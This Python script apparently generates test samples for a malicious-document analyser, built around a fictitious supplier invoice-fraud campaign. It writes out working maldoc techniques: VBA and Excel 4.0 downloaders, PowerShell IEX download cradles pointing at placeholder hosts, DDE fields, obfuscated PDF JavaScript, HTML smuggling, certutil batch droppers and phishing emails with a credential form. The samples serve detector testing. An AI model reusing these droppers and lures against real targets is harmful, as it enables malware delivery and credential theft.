#!/usr/bin/env python3
"""Generate realistic, benign sample files — one per in-scope type — under ``samples/``.

All samples tell one (fictitious) story: an invoice-fraud campaign that
impersonates a supplier, *Suministros Iberia S.L.*, against the finance team of
*Grupo Ejemplo*. Each file is a structurally real document of its type carrying
the techniques real maldocs use, so every DocuTraceX module has something to
find:

- Word: VBA downloader (AutoOpen, URLDownloadToFile, WScript.Shell, Base64
  PowerShell in a document variable), DDEAUTO, remote template injection,
  INCLUDEPICTURE tracking, custom properties, rsids, a global-template macro.
- Excel: invoice sheets, WEBSERVICE/FILTERXML, hidden + very-hidden sheets, an
  Excel 4.0 macro sheet with Auto_Open (EXEC/CALL/URLDownloadToFile), VBA
  Workbook_Open; legacy BIFF8 with a very-hidden macro sheet.
- PowerPoint: slides with links, the mouse-over ``ppaction://program`` trick,
  VBA in macro-enabled variants.
- Legacy .doc/.dot: real CFB with VBA, SummaryInformation and an ObjectPool
  holding an Equation Editor object / an OLE Package.
- RTF: Equation Editor, OLE2Link + ``\\objupdate``, a Package, remote template,
  INCLUDEPICTURE, obfuscated ``\\objdata``.
- PDF: invoice lure with OpenAction JavaScript (obfuscated: eval/unescape),
  a Launch action, a link and a QR code to the phishing page, a submit form and
  the macro document embedded.
- Email (.eml/.emlx/.msg): spoofed supplier with SPF/DMARC fail, two Received
  hops, PHPMailer, a DKIM signature broken by a later edit of the amount, Safe
  Links + Proofpoint wrapped look-alike link, tracking pixel, and attachments:
  the .docm, the RTF disguised as .doc, a double-extension "PDF", a QR image and
  an HTML-smuggling page.
- Encrypted (``encrypted/``): an email whose AES ZIP holds a password-protected
  workbook, with the password in the body; a workbook encrypted with Excel's
  default ``VelvetSweatshop``.

Every host, address and payload is an inert documentation value: ``*.example``
domains (RFC 2606), TEST-NET IPs (RFC 5737), placeholder binaries ("MZ" + text).
Nothing here is executable malware.

``sample.xlsb`` is oletools' benign Excel 4.0 test file (BSD-2-Clause, see
samples/README.md): pyxlsb2 can read XLSB but nothing can write it.

The samples are stored in ``samples/samples.zip``, encrypted with the usual
password ``infected`` so antivirus engines do not flag them (the loose files are
git-ignored).

Run:  python scripts/make_samples.py             # regenerate samples/samples.zip
      python scripts/make_samples.py --extract   # unpack it into samples/
"""

from __future__ import annotations

import base64
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import mailkit as mk  # noqa: E402
import officekit as ok  # noqa: E402
import pdfkit as pk  # noqa: E402
import rtfkit as rk  # noqa: E402
from cfb import build_cfb  # noqa: E402
from ovba import Module, vba_storage  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
SAMPLES = ROOT / "samples"

# --- the campaign (all inert documentation values) ------------------------------------
SUPPLIER = "Suministros Iberia S.L."
SUPPLIER_DOMAIN = "suministros-iberia.example.com"
VICTIM_DOMAIN = "grupoejemplo.example"
PAYLOAD_URL = "http://cdn-update.example.net/files/upd.bin"
STAGE2_URL = "http://198.51.100.23/a.ps1"
TEMPLATE_URL = "http://198.51.100.23/plantillas/Normal.dotm"
PIXEL_URL = "http://cdn-update.example.net/px/logo.png"
PHISH_URL = "https://login.rnicrosoft-online.example/owa/?id=fin-0187"
PORTAL_URL = f"https://{SUPPLIER_DOMAIN}/portal/factura/2026-0187"
C2_IP = "203.0.113.47"
INVOICE = "2026-0187"
AMOUNT = "1.250,00"

PS_STAGE = f"IEX (New-Object Net.WebClient).DownloadString('{STAGE2_URL}')"
PS_B64 = base64.b64encode(PS_STAGE.encode("utf-16-le")).decode()
MZ_STUB = b"MZ\x90\x00" + b"\x00" * 60 + b"This is an inert DocuTraceX sample, not a program.\r\n"

# --- VBA ------------------------------------------------------------------------------
VBA_DOWNLOADER = f'''Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" _
    (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, _
     ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long

Sub AutoOpen()
    ActualizarFactura
End Sub

Sub Document_Open()
    ActualizarFactura
End Sub

Private Function D(s As String) As String
    Dim i As Integer, r As String
    For i = 1 To Len(s) Step 2
        r = r & Chr(CLng("&H" & Mid(s, i, 2)))
    Next i
    D = r
End Function

Sub ActualizarFactura()
    Dim u As String, p As String, sh As Object
    u = "ht" & "tp://cdn-update.example.net" & D("2f66696c65732f7570642e62696e")
    p = Environ("TEMP") & "\\upd.exe"
    URLDownloadToFileA 0, u, p, 0, 0
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -nop -w hidden -enc " & ActiveDocument.Variables("cfg").Value, 0, False
    sh.Run p, 0, False
End Sub
'''

VBA_TEMPLATE = '''Sub AutoExec()
    ' Global template: runs every time Word starts
    Dim f As String
    f = Environ("APPDATA") & "\\Microsoft\\Word\\STARTUP\\sync.dotm"
    If Dir(f) = "" Then FileCopy ActiveDocument.FullName, f
End Sub

Sub AutoNew()
    Shell "cmd /c start /min powershell -w hidden -c ""iwr http://cdn-update.example.net/n -o $env:TEMP\\n.exe""", 0
End Sub
'''

# ref: sJkzUVgDiA
VBA_WORKBOOK = '''Private Sub Workbook_Open()
    Dim x As Object
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", "http://cdn-update.example.net/files/upd.bin", False
    x.Send
    Dim s As Object
    Set s = CreateObject("ADODB.Stream")
    s.Type = 1: s.Open: s.Write x.responseBody
    s.SaveToFile Environ("TEMP") & "\\upd.exe", 2
    Shell Environ("TEMP") & "\\upd.exe", vbHide
End Sub
'''

VBA_PPT = '''Sub Auto_Open()
    Dim o As Object
    Set o = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process")
    o.Create "mshta http://cdn-update.example.net/p.hta", Null, Null, 0
End Sub
'''

# --- Word -----------------------------------------------------------------------------
W_DOC = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
W_DOCM = "application/vnd.ms-word.document.macroEnabled.main+xml"
W_DOTX = "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml"
W_DOTM = "application/vnd.ms-word.template.macroEnabledTemplate.main+xml"

INVOICE_TEXT = [
    f"{SUPPLIER} — Departamento de Administración",
    "Calle de la Industria 42, 28045 Madrid · CIF B-00000000",
    f"FACTURA Nº {INVOICE}",
    "Cliente: Grupo Ejemplo S.A. — Dpto. Financiero",
    f"Concepto: suministro de material de oficina (pedido PO-2026-0412). Importe total: {AMOUNT} EUR (IVA incl.).",
    "Este documento ha sido protegido. Para ver el contenido, pulse «Habilitar edición» y después «Habilitar contenido».",
    f"Si no puede visualizarlo, descárguelo desde {PORTAL_URL} o contacte con soporte ({C2_IP}).",
]


def _core(title: str, creator: str, last_by: str, created: str, modified: str, rev: int = 4) -> str:
    return ok.core_xml(title, creator, last_by, created, modified, rev)


def word_docm() -> bytes:
    """Factura_2026-0187.docm: VBA downloader + DDEAUTO + doc variable payload."""
    return ok.docm(
        INVOICE_TEXT, [Module("NewMacros", VBA_DOWNLOADER)],
        fields=['DDEAUTO c:\\\\Windows\\\\System32\\\\cmd.exe "/k powershell -w hidden -c iwr '
                f'{PAYLOAD_URL} -o %TEMP%\\\\upd.exe"'],
        doc_vars={"cfg": PS_B64},
        custom={"Departamento": "Facturación", "Referencia": f"FAC-{INVOICE}"},
        core=_core(f"Factura {INVOICE}", "Administracion", "jmartin", "2026-10-08T07:12:00Z",
                   "2026-10-13T16:48:00Z", 7),
        app=ok.app_xml("Microsoft Office Word", SUPPLIER, "Normal.dotm", pages=1, total_time=42),
        rsids=["00A1B2C3", "00D4E5F6", "0047AA19"])


def word_docx() -> bytes:
    """Propuesta comercial with a remote template (template injection) and a tracking image."""
    return ok.docm(
        ["Propuesta comercial 2027 — Grupo Ejemplo",
         "Adjuntamos las condiciones revisadas para el próximo ejercicio.",
         "El documento se completa automáticamente al abrirlo; espere unos segundos."],
        fields=[f'INCLUDEPICTURE "{PIXEL_URL}" \\d'],
        remote_template=TEMPLATE_URL,
        core=_core("Propuesta comercial 2027", "María López", "Administrador", "2026-09-30T10:00:00Z",
                   "2026-10-12T08:31:00Z"),
        app=ok.app_xml("Microsoft Office Word", SUPPLIER), rsids=["00B1C2D3", "0047AA19"], macro=False)


def word_dotx() -> bytes:
    return ok.retype(ok.docm(
        ["Plantilla corporativa — Comunicaciones a proveedores", "[Nombre del proveedor]", "[Cuerpo del mensaje]"],
        fields=[f'INCLUDEPICTURE "{PIXEL_URL}" \\d'],
        custom={"Plantilla": "Proveedores v3", "Propietario": "Compras"},
        core=_core("Plantilla proveedores", "Compras", "Compras", "2026-06-01T09:00:00Z", "2026-10-01T09:00:00Z"),
        app=ok.app_xml("Microsoft Office Word", "Grupo Ejemplo S.A."), macro=False), W_DOC, W_DOTX)


def word_dotm() -> bytes:
    return ok.retype(ok.docm(
        ["Plantilla global de facturación", "No elimine este archivo: lo usa la macro de numeración."],
        [Module("AutoMacros", VBA_TEMPLATE)], remote_template=TEMPLATE_URL,
        core=_core("Facturacion", "Administracion", "jmartin", "2026-09-01T09:00:00Z", "2026-10-13T16:50:00Z"),
        app=ok.app_xml("Microsoft Office Word", SUPPLIER)), W_DOCM, W_DOTM)


# --- Excel ----------------------------------------------------------------------------
X_CT = {
    ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
    ".xlsm": "application/vnd.ms-excel.sheet.macroEnabled.main+xml",
    ".xltx": "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml",
    ".xltm": "application/vnd.ms-excel.template.macroEnabled.main+xml",
    ".xlam": "application/vnd.ms-excel.addin.macroEnabled.main+xml",
}

INVOICE_ROWS = [
    [f"{SUPPLIER}", None, None, f"Factura {INVOICE}"],
    ["Fecha", "13/10/2026", None, "Vencimiento: 20/10/2026"],
    [],
    ["Referencia", "Descripción", "Unidades", "Importe (EUR)"],
    ["MO-1120", "Papel A4 80 g (caja 5 paquetes)", 40, 380.0],
    ["MO-2210", "Tóner compatible HP 26A", 6, 498.0],
    ["MO-3305", "Archivadores A-Z lomo ancho", 60, 155.0],
    [None, None, "Base imponible", "=SUM(D5:D7)"],
    [None, None, "IVA 21%", "=D8*0.21"],
    [None, None, "TOTAL", "=D8+D9"],
    [],
    ["Estado del pago", f'=WEBSERVICE("https://{SUPPLIER_DOMAIN}/api/estado?f={INVOICE}")'],
    ["Cuenta de abono", '=FILTERXML(WEBSERVICE("http://cdn-update.example.net/iban.xml"),"//iban")'],
]
DATA_ROWS = [["IBAN anterior", "ES00 0000 0000 0000 0000 0000"],
             ["IBAN nuevo (desde 10/2026)", "ES99 9999 9999 9999 9999 9999"],
             ["Contacto", "pagos.suministros@mail-box.example.org"]]
XLM_ROWS = [
    ['=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://cdn-update.example.net/files/upd.bin",'
     '"C:\\Users\\Public\\upd.dll",0,0)'],
    ['=EXEC("rundll32.exe C:\\Users\\Public\\upd.dll,DllRegisterServer")'],
    ['=ALERT("El documento no es compatible con su versión de Excel.",2)'],
    ["=HALT()"],
]


def excel(ext: str) -> bytes:
    macro = ext in (".xlsm", ".xltm", ".xlam")
    sheets = [("Factura", "visible", INVOICE_ROWS), ("Datos", "hidden", DATA_ROWS)]
    return ok.xlsx(
        sheets, main_ct=X_CT[ext],
        macro_sheets=[("Macro1", "veryHidden", XLM_ROWS)] if macro else None,
        defined_names={"_xlnm.Auto_Open": "Macro1!$A$1"} if macro else None,
        modules=[Module("ThisWorkbook", VBA_WORKBOOK, document=True)] if macro else None,
        core=_core(f"Factura {INVOICE}", "Contabilidad", "jmartin", "2026-10-07T11:02:00Z", "2026-10-13T16:40:00Z"),
        app=ok.app_xml("Microsoft Excel", SUPPLIER),
        custom={"Referencia": f"FAC-{INVOICE}"})


# --- PowerPoint -----------------------------------------------------------------------
P_CT = {
    ".pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
    ".pptm": "application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml",
    ".potx": "application/vnd.openxmlformats-officedocument.presentationml.template.main+xml",
    ".potm": "application/vnd.ms-powerpoint.template.macroEnabled.main+xml",
    ".ppsx": "application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml",
    ".ppsm": "application/vnd.ms-powerpoint.slideshow.macroEnabled.main+xml",
    ".ppam": "application/vnd.ms-powerpoint.addin.macroEnabled.main+xml",
    ".sldx": "application/vnd.openxmlformats-officedocument.presentationml.slide.main+xml",
    ".sldm": "application/vnd.ms-powerpoint.slide.macroEnabled.main+xml",
}


def powerpoint(ext: str) -> bytes:
    macro = ext.endswith("m")
    slides = [
        {"title": "Nuevo procedimiento de pago a proveedores",
         "lines": [f"A partir del 15/10/2026 {SUPPLIER} cambia su cuenta de abono.",
                   "Actualice los datos bancarios en el portal antes del cierre mensual."],
         "link": (PHISH_URL, "Acceder al portal de proveedores")},
        {"title": "Calendario de cierre", "lines": ["Semana 42: conciliación", "Semana 43: pagos"]},
    ]
    if ext in (".ppsx", ".ppsm"):
        # The 2017 mouse-over technique: moving the pointer over the text runs a program.
        slides[1]["mouseover_program"] = ("powershell -nop -w hidden -c \"iwr " + PAYLOAD_URL +
                                          " -o $env:TEMP\\upd.exe; start $env:TEMP\\upd.exe\"")
    return ok.pptx(slides, main_ct=P_CT[ext], modules=[Module("Module1", VBA_PPT)] if macro else None,
                   core=_core("Procedimiento de pagos", "Tesorería", "jmartin", "2026-10-05T08:00:00Z",
                              "2026-10-13T17:05:00Z"),
                   app=ok.app_xml("Microsoft Office PowerPoint", SUPPLIER))


# --- legacy OLE -----------------------------------------------------------------------

def _biff_rec(rtype: int, data: bytes) -> bytes:
    return struct.pack("<HH", rtype, len(data)) + data


def _biff8_workbook() -> bytes:
    """A small BIFF8 Workbook stream: a visible sheet and a very-hidden Excel 4.0
    macro sheet (what plugin_biff/XLMMacroDeobfuscator look for)."""
    def bof(dt: int) -> bytes:
        return _biff_rec(0x0809, struct.pack("<HHHHII", 0x0600, dt, 0x0DBB, 0x07CC, 0, 0x06))

    def boundsheet(pos: int, state: int, kind: int, name: str) -> bytes:
        nm = name.encode("latin-1")
        return _biff_rec(0x0085, struct.pack("<IBBBB", pos, state, kind, len(nm), 0) + nm)

    def label(row: int, col: int, text: str) -> bytes:
        t = text.encode("latin-1")
        return _biff_rec(0x0204, struct.pack("<HHHH", row, col, 15, len(t)) + b"\x00" + t)

    sheets = [("Factura", 0, 0, [label(0, 0, f"Factura {INVOICE}"), label(1, 0, f"Importe: {AMOUNT} EUR")]),
              ("Macro1", 2, 1, [label(0, 0, "=EXEC(\"cmd /c start http://cdn-update.example.net/x\")")])]
    globals_ = [bof(0x0005), _biff_rec(0x0042, struct.pack("<H", 1252))]
    head_len = sum(len(r) for r in globals_)
    bs_len = sum(len(boundsheet(0, 0, 0, n)) for n, *_ in sheets)
    eof = _biff_rec(0x000A, b"")
    pos = head_len + bs_len + len(eof)
    bodies, bss = [], []
    for name, state, kind, recs in sheets:
        body = bof(0x0040 if kind == 1 else 0x0010) + b"".join(recs) + eof
        bss.append(boundsheet(pos, state, kind, name))
        bodies.append(body)
        pos += len(body)
    return b"".join(globals_) + b"".join(bss) + eof + b"".join(bodies)


def _ppt_stream() -> bytes:
    text = "Nuevo procedimiento de pago a proveedores".encode("utf-16-le")
    atom = struct.pack("<HHI", 0, 0x0FA0, len(text)) + text  # TextCharsAtom
    return struct.pack("<HHI", 0x000F, 0x03E8, len(atom)) + atom  # DocumentContainer


def legacy(ext: str) -> bytes:
    summary = ok.summary_information(
        "Administracion", "jmartin", "Normal.dotm" if ext in (".doc", ".dot") else "",
        title=f"Factura {INVOICE}",
        app={".doc": "Microsoft Office Word", ".dot": "Microsoft Office Word", ".xls": "Microsoft Excel",
             ".xlt": "Microsoft Excel", ".xla": "Microsoft Excel"}.get(ext, "Microsoft Office PowerPoint"))
    text = "\r".join(INVOICE_TEXT)
    if ext == ".doc":
        return ok.doc_legacy(text, [Module("NewMacros", VBA_DOWNLOADER)],
                             objects={"_1823459012": ok.equation_object()}, summary=summary)
    if ext == ".dot":
        return ok.doc_legacy("Plantilla global de facturación", [Module("AutoMacros", VBA_TEMPLATE)],
                             objects={"_1823459013": ok.package_object("Factura.pdf.vbs",
                                                                     b'MsgBox "DocuTraceX sample"')},
                             summary=summary)
    if ext in (".xls", ".xlt", ".xla"):
        return build_cfb({"Workbook": _biff8_workbook(), "\x05SummaryInformation": summary,
                          "_VBA_PROJECT_CUR": vba_storage([Module("ThisWorkbook", VBA_WORKBOOK, document=True)])})
    # Data appended after the compound file (ignored by PowerPoint; a hiding place for a payload).
    return build_cfb({"PowerPoint Document": _ppt_stream(), "Current User": b"\x00" * 20,
                      "\x05SummaryInformation": summary}) + MZ_STUB * 40


# --- RTF ------------------------------------------------------------------------------

def rtf_doc() -> bytes:
    return rk.build_rtf(
        INVOICE_TEXT[:5] + ["El detalle de la factura se muestra en el objeto incrustado. Si aparece un aviso, "
                            "pulse «Sí» para actualizar los vínculos."],
        title=f"Factura {INVOICE}", author="Administracion", operator="jmartin",
        company=SUPPLIER, template=TEMPLATE_URL,
        body_extra=[rk.equation(junk=" {\\*\\dtx} "), rk.ole2link(f"http://{C2_IP}/doc/factura.rtf"),
                    rk.package("Factura.pdf.vbs", b'MsgBox "DocuTraceX sample"'),
                    rk.field(f'INCLUDEPICTURE "{PIXEL_URL}" \\d', "logo"),
                    rk.field(f'HYPERLINK "{PORTAL_URL}"', "Ver factura en el portal")])


# --- PDF ------------------------------------------------------------------------------

PDF_JS = ("var _0x=['\\x68\\x74\\x74\\x70','://login.rnicrosoft-online.example/owa/?id=fin-0187'];"
          "eval(unescape('%61%70%70%2E%61%6C%65%72%74%28%27%45%6C%20%64%6F%63%75%6D%65%6E%74%6F%20%65%73%74"
          "%61%20%70%72%6F%74%65%67%69%64%6F%27%29'));"
          "this.exportDataObject({cName:'report.docm', nLaunch:2});"
          "app.launchURL(_0x[0]+_0x[1], true);")


def pdf_doc() -> bytes:
    data, _root, _n = pk.lure_pdf(
        [f"{SUPPLIER}", f"Factura {INVOICE} — Importe {AMOUNT} EUR", "",
         "Documento protegido por Microsoft 365.",
         "Para ver la factura, inicie sesión con su cuenta corporativa",
         "o escanee el código QR con su móvil.", "",
         "Si el documento no se abre, pulse «Abrir» en el aviso de seguridad."],
        link=PHISH_URL, qr=PHISH_URL, open_js=PDF_JS, launch=("cmd.exe", "/c start report.docm"),
        submit_url=f"http://{C2_IP}/collect.php", embedded=("report.docm", word_docm()),
        title=f"Factura {INVOICE}", author="Administracion")
    return data


# --- email ----------------------------------------------------------------------------

RECEIVED = [
    f"from mx01.{VICTIM_DOMAIN} (mx01.{VICTIM_DOMAIN} [198.51.100.10]) by mbox.{VICTIM_DOMAIN} "
    "with ESMTPS id 4Hq2kT0x9Lz; Tue, 13 Oct 2026 17:12:09 +0000",
    f"from vps-2291.hosting.example (unknown [{C2_IP}]) by mx01.{VICTIM_DOMAIN} with ESMTP id 7Fg3; "
    "Tue, 13 Oct 2026 17:12:04 +0000",
]
AUTH = (f"mx01.{VICTIM_DOMAIN}; spf=fail (sender IP is {C2_IP}) smtp.mailfrom=bounce.rnicrosoft-online.example; "
        f"dkim=fail header.d={SUPPLIER_DOMAIN}; dmarc=fail action=none header.from={SUPPLIER_DOMAIN}")
SUBJECT = f"Factura {INVOICE} pendiente de pago - URGENTE"
# rev: pzFQkCWMlr
FROM = f'"{SUPPLIER} | Administración" <facturacion@{SUPPLIER_DOMAIN}>'
TO = f"Cuentas a pagar <cuentas.pagar@{VICTIM_DOMAIN}>"
TEXT = (f"Estimados señores:\n\nLes recordamos que la factura {INVOICE} por importe de {AMOUNT} EUR vence hoy.\n"
        "Hemos cambiado nuestra cuenta bancaria; encontrarán los nuevos datos en el portal de proveedores.\n\n"
        f"Acceso: {PHISH_URL}\n\nUn saludo,\nDepartamento de Administración\n{SUPPLIER}\n")
# k: 9qwDpeYpKo
HTML = f"""<html><head><meta charset="utf-8"></head><body style="font-family:Calibri,Arial,sans-serif">
<p>Estimados señores:</p>
<p>Les recordamos que la <b>factura {INVOICE}</b> por importe de <b>{AMOUNT} EUR</b> vence <b>hoy</b>.</p>
<p>Hemos cambiado nuestra cuenta bancaria. Consulten los nuevos datos en el portal de proveedores:</p>
<p><a href="{mk.safelinks(mk.proofpoint_v3(PHISH_URL))}">{PORTAL_URL}</a></p>
<p>También pueden escanear el código QR adjunto con su móvil.</p>
<div style="display:none;font-size:0">invoice payment remittance confirmed safe sender</div>
<p>Un saludo,<br>Departamento de Administración<br>{SUPPLIER}</p>
<img src="http://cdn-update.example.net/o.gif?u=cuentas.pagar" width="1" height="1" alt="">
</body></html>"""
SMUGGLING_HTML = f"""<!doctype html><html><head><meta charset="utf-8"><title>Factura {INVOICE}</title></head>
<body><p>Preparando su documento…</p>
<script>
var d = atob('{base64.b64encode(MZ_STUB).decode()}');
var b = new Uint8Array(d.length); for (var i = 0; i < d.length; i++) b[i] = d.charCodeAt(i);
var f = new Blob([b], {{type: 'application/octet-stream'}});
var a = document.createElement('a'); a.href = URL.createObjectURL(f); a.download = 'Factura_{INVOICE}.zip';
document.body.appendChild(a); a.click();
setTimeout("location.href='{PHISH_URL}'", 3000);
</script></body></html>"""


def _attachments() -> list[tuple[str, str, bytes]]:
    return [
        ("report.docm", "application/vnd.ms-word.document.macroEnabled.12", word_docm()),
        (f"Factura_{INVOICE}.pdf.exe", "application/octet-stream", MZ_STUB),
        ("pedido.doc", "application/msword", rtf_doc()),
        ("Factura.html", "text/html", SMUGGLING_HTML.encode()),
        ("escanear.png", "image/png", mk.qr_png(PHISH_URL)),
    ]


def eml_doc() -> bytes:
    signed = mk.build_email(
        from_=FROM, to=TO, subject=SUBJECT, html=HTML, text=TEXT, received=[],
        reply_to="pagos.suministros@mail-box.example.org",
        x_mailer="PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)",
        message_id="<b7c1e0f2a93d@vps-2291.hosting.example>", attachments=_attachments(),
        dkim_domain=SUPPLIER_DOMAIN, tamper_after_signing=(AMOUNT, "7.250,00"))
    # Trace headers are added on top by the receiving MTAs, after the signature.
    trace = ["Return-Path: <bounce@bounce.rnicrosoft-online.example>"] + \
        [f"Received: {r}" for r in RECEIVED] + [f"Authentication-Results: {AUTH}"]
    return ("\r\n".join(trace) + "\r\n").encode() + signed


def emlx_doc() -> bytes:
    message = eml_doc()
    plist = (b'<?xml version="1.0" encoding="UTF-8"?>\n'
             b'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
             b'"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
             b'<plist version="1.0"><dict><key>date-received</key><integer>1792170729</integer>'
             b'<key>flags</key><integer>8590195713</integer></dict></plist>\n')
    return f"{len(message)}\n".encode() + message + plist


def msg_doc() -> bytes:
    from mkmsg import build_msg

    headers = "".join(f"Received: {r}\r\n" for r in RECEIVED) + (
        f"Authentication-Results: {AUTH}\r\nFrom: {FROM}\r\nTo: {TO}\r\n"
        "Reply-To: pagos.suministros@mail-box.example.org\r\n"
        "Return-Path: <bounce@bounce.rnicrosoft-online.example>\r\n"
        f"Subject: {SUBJECT}\r\nX-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)\r\n"
        "Message-ID: <b7c1e0f2a93d@vps-2291.hosting.example>\r\n")
    return build_msg(headers, SUBJECT, TEXT, f"facturacion@{SUPPLIER_DOMAIN}",
                     [(n, d) for n, _ct, d in _attachments()], html=HTML)


# --- lab email (local phishing-kit simulator) -------------------------------------------

LAB_URL = "http://127.0.0.1:8808/r/" + base64.urlsafe_b64encode(f"cuentas.pagar@{VICTIM_DOMAIN}".encode()).decode().rstrip("=")
LAB_FORM = f"""<!doctype html><html lang="es"><head><meta charset="utf-8"><title>Microsoft 365 - Acceso</title></head>
<body style="font-family:Segoe UI,Arial"><div style="width:420px;margin:60px auto"><b>Microsoft</b>
<h2>Confirme su cuenta para ver el documento</h2>
<form method="post" action="http://127.0.0.1:8808/owa/auth.php">
<input type="hidden" name="src" value="attachment">
<input type="email" name="loginfmt" value="cuentas.pagar@{VICTIM_DOMAIN}">
<input type="password" name="passwd" placeholder="Contraseña"><button type="submit">Iniciar sesión</button>
</form></div></body></html>"""


def lab_eml() -> bytes:
    """Email for the local simulator (scripts/phish_lab.py): its link and its
    attached login form point to http://127.0.0.1:8808."""
    html = HTML.replace(mk.safelinks(mk.proofpoint_v3(PHISH_URL)), LAB_URL)
    return mk.build_email(
        from_=FROM, to=TO, subject=f"[LAB] {SUBJECT}", html=html, text=TEXT.replace(PHISH_URL, LAB_URL),
        received=RECEIVED, auth_results=AUTH, reply_to="pagos.suministros@mail-box.example.org",
        return_path="<bounce@bounce.rnicrosoft-online.example>", x_mailer="PHPMailer 6.8.0",
        message_id="<lab-0187@vps-2291.hosting.example>",
        attachments=[("Acceso_portal.html", "text/html", LAB_FORM.encode())])


# --- encrypted samples (unlocking) -----------------------------------------------------

ENC_PASSWORD = "Fact2026"
ENC_TEXT = (f"Estimados señores:\n\nAdjuntamos la factura {INVOICE} con los nuevos datos bancarios.\n"
            "Por seguridad el archivo va protegido.\n\n"
            f"La contraseña del archivo es: {ENC_PASSWORD}\n\nUn saludo,\nDepartamento de Administración\n{SUPPLIER}\n")


def _encrypt_ooxml(plain: bytes, password: str) -> bytes:
    import io

    from msoffcrypto.format.ooxml import OOXMLFile

    out = io.BytesIO()
    OOXMLFile(io.BytesIO(plain)).encrypt(password, out)
    return out.getvalue()


def encrypted_eml() -> bytes:
    """Gateway evasion: an AES-encrypted ZIP holding a password-protected .xlsm,
    with the password in the body (in Spanish) — DocuTraceX finds it, opens the
    ZIP and the workbook, and analyses the macros inside."""
    import io

    import pyzipper

    inner = _encrypt_ooxml(excel(".xlsm"), ENC_PASSWORD)
    buf = io.BytesIO()
    with pyzipper.AESZipFile(buf, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as z:
        z.setpassword(ENC_PASSWORD.encode())
        z.writestr(f"Factura_{INVOICE}.xlsm", inner)
    html = ("<html><body style=\"font-family:Calibri,Arial\">"
            + "".join(f"<p>{line}</p>" for line in ENC_TEXT.split("\n\n")).replace(
                ENC_PASSWORD, f"<b>{ENC_PASSWORD}</b>") + "</body></html>")
    return mk.build_email(
        from_=FROM, to=TO, subject=f"Factura {INVOICE} (protegida)", html=html, text=ENC_TEXT,
        received=RECEIVED, auth_results=AUTH, reply_to="pagos.suministros@mail-box.example.org",
        x_mailer="PHPMailer 6.8.0", message_id="<enc-0187@vps-2291.hosting.example>",
        attachments=[(f"Factura_{INVOICE}.zip", "application/zip", buf.getvalue())])


def velvet_xlsm() -> bytes:
    """The macro workbook encrypted with Excel's built-in 'VelvetSweatshop'
    password: it opens without a prompt but scanners only see ciphertext."""
    return _encrypt_ooxml(excel(".xlsm"), "VelvetSweatshop")


# --- standalone obfuscated scripts (deobfuscation demos) ------------------------------
# Dropped/attached scripts that only reveal their intent once deobfuscated — one per
# engine, so uploading each shows the "deobfuscate first, then analyse" path. All inert:
# the recovered payloads reference the same *.example / TEST-NET campaign indicators.

# The JScript the dropper runs once decoded (ActiveX download + PowerShell stage 2).
_JS_PAYLOAD = (
    'var x=new ActiveXObject("MSXML2.XMLHTTP");'
    f'x.open("GET","{PAYLOAD_URL}",false);x.send();'
    'var sh=new ActiveXObject("WScript.Shell");'
    f'sh.Run("powershell -nop -w hidden -enc {PS_B64}",0);'
)


def obf_js() -> bytes:
    """A .js whose whole body is ``eval(unescape("%..%.."))`` — the reference
    case: one long run of percent escapes the multi-pass decoder must peel."""
    pct = "".join("%%%02x" % b for b in _JS_PAYLOAD.encode())
    body = ("// Factura 2026-0187 - visor seguro (no editar)\n"
            f'eval(unescape("{pct}"));\n')
    return body.encode()


def stage2_ps1() -> bytes:
    """A .ps1 stage-2 loader hidden behind backticks + Base64 (FromBase64String)."""
    b64 = base64.b64encode(PS_STAGE.encode("utf-8")).decode()
    body = (
        "# Factura 2026-0187 - actualizador (stage 2)\n"
        "$ErrorActionPreference = 'SilentlyContinue'\n"
        f"I`E`X ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64}')))\n"
    )
    return body.encode()


def dropper_vbs() -> bytes:
    """A .vbs that builds the stage-2 URL from Chr() codes and runs PowerShell
    through an Execute() wrapper — exercises Chr/concat/Execute deobfuscation."""
    chr_url = "&".join("Chr(%d)" % b for b in STAGE2_URL.encode())
    body = (
        "' Factura 2026-0187 - adjunto\n"
        "Dim u\n"
        f"u = {chr_url}\n"
        'Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w hidden -c iwr "" & u, 0, False")\n'
    )
    return body.encode()


def obf_obfuscatorio_js() -> bytes:
    """A .js obfuscated with obfuscator.io (string-array + rotator + accessor,
    control-flow flattening) — the scheme the pure-Python cascade cannot flatten
    and webcrack does. Pre-generated (no Node needed at sample time) and stored
    base64 beside this script; all indicators are inert."""
    b64 = (Path(__file__).resolve().parent / "_obfuscatorio_js.b64").read_text()
    return base64.b64decode("".join(b64.split()))


def dropper_bat() -> bytes:
    """A .bat using caret escaping + ``set`` indirection to hide a PowerShell
    launch and a certutil download — exercises the batch deobfuscator + rules."""
    body = (
        "@echo off\r\n"
        "rem Factura 2026-0187 - instalador\r\n"
        "set a=power\r\n"
        "set b=shell\r\n"
        f"%a%%b% -nop -w hidden -enc {PS_B64}\r\n"
        f"c^e^r^t^util -urlcache -split -f {PAYLOAD_URL} %TEMP%\\upd.bin\r\n"
        "start /b %TEMP%\\upd.bin\r\n"
    )
    return body.encode()


def loader_hta() -> bytes:
    """An .hta carrying both VBScript and JScript that download and run —
    exercises the HTA container extraction and the VBScript + JScript engines."""
    body = (
